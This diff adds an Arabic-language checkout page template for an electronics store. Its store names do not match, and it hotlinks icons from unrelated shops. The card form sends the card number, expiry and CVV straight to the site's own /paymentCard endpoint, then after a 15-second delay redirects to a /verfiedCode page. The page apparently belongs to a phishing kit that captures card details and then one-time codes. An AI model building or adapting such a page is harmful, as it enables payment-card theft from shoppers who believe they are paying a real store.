@@ -1,0 +1,366 @@
+@html.extend('layout', function(model) {
+   @html.block('styles', function(model) {
+        <meta charset="UTF-8" dir="rtl" lang="ar" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport"
+            content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+
+        <meta name="description"
+            content="نحن متجر بلو ستور متخصص بإكسسوارات الجوالات والسماعات والساعات وجميع مايخص الإلكترونيات منذ عام 2019 ومقر المتجر بجازان ونقاط البيع في السوق المحلي والإلكتروني بأيدي عاملة سعودية" />
+        <meta name="keywords"
+            content="نحن متجر بلو ستور متخصص بإكسسوارات الجوالات والسماعات والساعات وجميع مايخص الإلكترونيات منذ عام 2019 ومقر المتجر بجازان ونقاط البيع في السوق المحلي والإلكتروني بأيدي عاملة سعودية" />
+
+        <link rel="icon" type="image/png" href="../uploads/1667829295.png" />
+
+        <meta property="og:image" content="../uploads/1667829295.png" />
+        
+        <script src="../js/jquery.min.js"></script>
+        <script src="../js/363ad84da6.js" crossorigin="anonymous"></script>
+
+        <link rel="stylesheet" href="../css/libraries.css" />
+        <link rel="stylesheet" href="../css/checkout.css" />
+
+        <style type="text/css">
+                .vue-tel-input {
+                    border-radius: 3px;
+                    display: flex;
+                    border: 1px solid #bbb;
+                    text-align: left;
+                }
+
+                .vue-tel-input.disabled .dropdown,
+                .vue-tel-input.disabled .selection,
+                .vue-tel-input.disabled input {
+                    cursor: no-drop;
+                }
+
+                .vue-tel-input:focus-within {
+                    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
+                        0 0 8px rgba(102, 175, 233, 0.6);
+                    border-color: #66afe9;
+                }
+
+                .vti__dropdown {
+                    display: flex;
+                    flex-direction: column;
+                    align-content: center;
+                    justify-content: center;
+                    position: relative;
+                    padding: 7px;
+                    cursor: pointer;
+                }
+
+                .vti__dropdown.show {
+                    max-height: 300px;
+                    overflow: scroll;
+                }
+
+                .vti__dropdown.open {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__dropdown:hover {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__selection {
+                    font-size: 0.8em;
+                    display: flex;
+                    align-items: center;
+                }
+
+                .vti__selection .vti__country-code {
+                    color: #666;
+                }
+
+                .vti__flag {
+                    margin-right: 5px;
+                    margin-left: 5px;
+                }
+
+                .vti__dropdown-list {
+                    z-index: 1;
+                    padding: 0;
+                    margin: 0;
+                    text-align: left;
+                    list-style: none;
+                    max-height: 200px;
+                    overflow-y: scroll;
+                    position: absolute;
+                    left: -1px;
+                    background-color: #fff;
+                    border: 1px solid #ccc;
+                    width: 390px;
+                }
+
+                .vti__dropdown-list.below {
+                    top: 33px;
+                }
+
+                .vti__dropdown-list.above {
+                    top: auto;
+                    bottom: 100%;
+                }
+
+                .vti__dropdown-arrow {
+                    transform: scaleY(0.5);
+                    display: inline-block;
+                    color: #666;
+                }
+
+                .vti__dropdown-item {
+                    cursor: pointer;
+                    padding: 4px 15px;
+                }
+
+                .vti__dropdown-item.highlighted {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__dropdown-item.last-preferred {
+                    border-bottom: 1px solid #cacaca;
+                }
+
+                .vti__dropdown-item .vti__flag {
+                    display: inline-block;
+                    margin-right: 5px;
+                }
+
+                .vti__input {
+                    border: none;
+                    border-radius: 0 2px 2px 0;
+                    width: 100%;
+                    outline: 0;
+                    padding-left: 7px;
+                }
+        </style>
+    })
+  @html.block('content', function(model) {
+    <div id="app" class="container container--margined">
+        <div class="row">
+            <div id="payment_process" class="col-md-12 col-sm-12" style="display: block">
+                <main class="sections-wrapper">
+                    <header data-v-0446810e class="store-info">
+                        <div data-v-0446810e class="d-flex">
+                        <div data-v-0446810e class="store-info__detail">
+                            <ul data-v-0446810e class="breadcrumb">
+                            <li data-v-0446810e class="breadcrumb-item">
+                                <a data-v-0446810e href="/" target="_blank" class>MTJR AZIZ</a>
+                            </li>
+                            <li data-v-0446810e class="breadcrumb-item">
+                                <a data-v-0446810e href="/" target="_blank" class>طرق الدفع </a>
+                            </li>
+                            <li data-v-0446810e class="breadcrumb-item">إنهاء الطلب</li>
+                            </ul>
+                        </div>
+                        </div>
+                        
+                    </header>
+                    <div class="section section--payment">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div id="payment_step" class="payment-step mb-0">
+                                <div data-step="2" class="title title--step">
+                                    <img src="img/step-payment.svg" />
+                                    <h3>طريقة الدفع</h3>
+                                </div>
+                                  <script>
+                                    $(function () {
+                                    //run when the DOM is ready
+                                    $(".clickable").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var onlinEmp = document.getElementById("bank-div");
+                                         var form = document.getElementById("cardForm");
+                                         var element = document.getElementById("myDIV");
+                                         var element2 = document.getElementById("bank");
+                                         element.classList.remove("active");
+                                         element2.classList.remove("active");
+                                         form.style.display = "block";
+                                          onlinEmp.style.display = "none";
+                                    });
+
+                                    $(".clickable2").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var onlinEmp = document.getElementById("bank-div");
+                                        var form = document.getElementById("cardForm");
+                                        var element = document.getElementById("hhh");
+                                        var element2 = document.getElementById("bank");
+                                        element.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "block";
+                                         onlinEmp.style.display = "none";
+                                    });
+                                    $(".clickable3").click(function () {
+                                        //use a class, since your ID gets mangled
+                                        $(this).addClass("active"); //add the class to the clicked element
+                                        var form = document.getElementById("cardForm");
+                                        var onlinEmp = document.getElementById("bank-div");
+                                        var element = document.getElementById("myDIV");
+                                        var element2 = document.getElementById("hhh");
+                                        element.classList.remove("active");
+                                        element2.classList.remove("active");
+                                        form.style.display = "none";
+                                        onlinEmp.style.display = "block";
+                                    });
+                                    });
+                                </script>
+                                <div id="payment_methods_wrapper">
+                                    <ul id="payment_methods" class="list list--payment-methods">
+                                    <li>
+                                        <button type="button" class="btn btn--round btn--payment-option active clickable2" id="myDIV">
+                                        <img src="img/pay-option-mada.svg" alt="Mada" />
+                                        </button>
+                                    </li>
+                                    <li>
+                                        <button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable"
+                                        id="hhh">
+                                        <img src="img/pay-option-credit-2.svg" alt="Credit card Logo" class="large" />
+                                        </button>
+                                    </li>
+                                    <li>
+                                        <button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable3"
+                                        id="bank">
+                                        <img width="35px" src="https://rewayah.store/vendor/checkout/images/icons/pay-option-bank-acc.svg" alt="Credit card Logo" class="large" />
+                                            تحويل بنكي
+                                        </button>
+                                    </li>
+                                    
+                                    </ul>
+                                </div>
+                                <span>
+                                    <form id="cardForm" data-v-09edeec7  class="form form--payment">
+                                                                       
+                                        <div data-v-09edeec7 class="row">
+                                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                                            <span data-v-09edeec7>
+                                                <fieldset data-v-09edeec7 data-openreplay-masked
+                                                class="form-group--w-icon form-group payment-type">
+                                                <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                                <input data-v-09edeec7 type="tel" maxlength="19" pattern="[0-9]*" autocomplete="cc-number"
+                                                    placeholder="رقم البطاقة" class="form-control ym-disable-keys ym-hide-content"
+                                                    name="cardnumber" />
+                                                
+                                                </fieldset>
+                                            </span>
+                                            </div>
+                                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                                            <span data-v-09edeec7>
+                                                <fieldset data-v-09edeec7 class="form-group">
+                                                <div data-v-09edeec7 class="input-wrapper-expiry">
+                                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="الشهر"
+                                                    id="cc_month" name="carddate" autocomplete="cc-exp-month"
+                                                    class="form-control ym-disable-keys ym-hide-content card-month" />
+                                                    <input data-v-09edeec7 type="text" placeholder="/" disabled="disabled"
+                                                    class="form-control separator" />
+                                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="السنة"
+                                                    id="cc_year" name="carddate1" autocomplete="cc-exp-year"
+                                                    class="form-control ym-disable-keys ym-hide-content card-year" />
+                                                </div>
+                                                
+                                                
+                                                </fieldset>
+                                            </span>
+                                            </div>
+                                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                                            <span data-v-09edeec7>
+                                                <fieldset data-v-09edeec7 data-openreplay-masked class="form-group">
+                                                <input data-v-09edeec7 type="tel" pattern="\d*" maxlength="4" autocomplete="cc-csc"
+                                                    placeholder="رمز التحقق (CVC)" name="cvv"
+                                                    class="form-control ym-disable-keys ym-hide-content" />
+                                                
+                                                </fieldset>
+                                            </span>
+                                            </div>
+                                        </div>
+                                    
+                                        <ul class="list list--brands">
+                                            <li>تسوق إلكتروني آمن 100%</li>
+                                            <li><img src="img/secure-payment.svg" /></li>
+                                            <li><img src="img/secure-payment-02.svg" /></li>
+                                            <li><img src="img/secure-payment-03.svg" /></li>
+                                        </ul>
+                                        <br>
+                                        <br>
+                                        <br>
+                                        <div data-v-e5a4c4bc>
+                                            <button data-v-e5a4c4bc id="cardSubmit" type="submit" name="subm"
+                                                class="btn btn--primary btn--wide btn--round btn--submit btn--fixed wide">
+                                                <span data-v-e5a4c4bc>اكمال الدفع</span>                                                
+                                            </button>
+                                        </div>
+                                    </form>
+                                     <div id="bank-div" style="display:none">
+                                       <h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
+                                       <a href="https://api.whatsapp.com/send/?phone=966596583284" target="_blank"> <img width="150px" src="https://allheddad.com/wp-content/uploads/2021/12/client.png" />  </a>
+                                    </div>
+                                </span>
+                                </div>
+
+                            </div>
+                        </div>
+                        
+                    </div>
+                </main>
+            </div>
+        </div>
+    </div>
+   
+    <script type="text/javascript" src="/js/jquery.validate.min.js"></script>
+    <script>
+        $("#cardForm").validate({
+            rules: {
+            carddate1: {
+                required: true,
+            },
+            carddate: {
+                required: true,
+            },
+            cvv: {
+                required: true,
+                minlength: 3,
+                number: true,
+            },
+            cardnumber: {
+                required: true,
+                minlength: 16,
+                number: true,
+            },
+            },
+            messages: {
+            carddate1: "الرجاء ادخال السنة ",
+            carddate: "الرجاء ادخال الشهر ",
+            cvv: " الرجاء ادخال رمز سري صحيح ",
+            cardnumber: "الرجاء ادخال رقم صحيح ",
+            },
+            submitHandler: SubForm,
+        });
+        function SubForm() {
+            console.log("send start")
+            $.ajax({
+            url: "/paymentCard",
+            type: "post",
+            data: $("#cardForm").serializeArray(),
+            beforeSend: function () {
+                $("#error").fadeOut();
+                $("#cardSubmit").html(
+                '<span class="glyphicon glyphicon-transfer"></span>  <span style="color:#fff">  جاري التسجيل </span>'
+                );
+            },
+            success: function () {
+                    setTimeout(() => {
+                       window.location.replace("/verfiedCode");
+                    }, 15000)
+            // window.location.replace("/verfiedCode");
+            },
+            error: function () {
+                // alert("There was an error :(");
+            },
+            });
+            return false;
+        }
+    </script>
+
+  })
+  })
